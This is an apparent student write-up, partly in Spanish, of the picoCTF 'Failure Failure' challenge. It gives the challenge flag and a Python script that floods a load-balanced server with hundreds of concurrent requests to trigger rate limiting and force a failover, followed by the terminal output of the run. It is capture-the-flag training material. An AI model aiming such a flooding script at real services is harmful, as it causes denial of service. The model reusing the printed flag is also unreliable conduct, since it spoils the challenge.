# Failure Failure

# Descripción

Welcome to Failure Failure — a high-available system. This challenge simulates a real-world failover scenario where one server is prioritized over the other. A load balancer stands between you and the truth — and it won't hand over the flag until you force its hand. You can begin your journey here to try and retrieve the flag. For reference:

    The HAProxy configuration used in this challenge is available here.
    The application code is available here

# Solución

```  
picoCTF{f41l0v3r_f0r_7h3_w1n_ec6ea57b}
```

## Código python

```  
─$ cat script.py
import requests 
from concurrent. futures  import  ThreadPoolExecutor 
import re 
import time

URL = "http://mysterious-sea.picoctf.net:53941/"
def send_request():
    try:
        r = requests.get(URL, timeout=3)
        return r
    except:
        return None
# Flood the server
print("Flooding the server to trigger rate limit...")
with ThreadPoolExecutor(max_workers=100) as executor:
    for _ in range(600):
        executor.submit(send_request)
# Poll for the flag
print("Checking for flag...")
for _ in range(30):
    r = requests.get(URL)
    if "picoCTF" in r.text:
        flag = re.search(r"picoCTF{.*}", r.text)
        print("Flag:", flag.group(0))
        break
    time.sleep(1)
                                                                           
┌──(kali㉿kali)-[~/Downloads/Examen]
└─$ 

```

## Resultado en la terminal

```  
─(kali㉿kali)-[~/Downloads/Examen]
└─$ python3 script.py
Flooding the server to trigger rate limit...
Checking for flag...
Flag: picoCTF{f41l0v3r_f0r_7h3_w1n_ec6ea57b}
                                                                           
┌──(kali㉿kali)-[~/Downloads/Examen]
└─$ 

```



# Notas adicionales


# Referencias


https://medium.com/@may.hack/picoctf-writeup-failure-failure-e629a92c3b6f


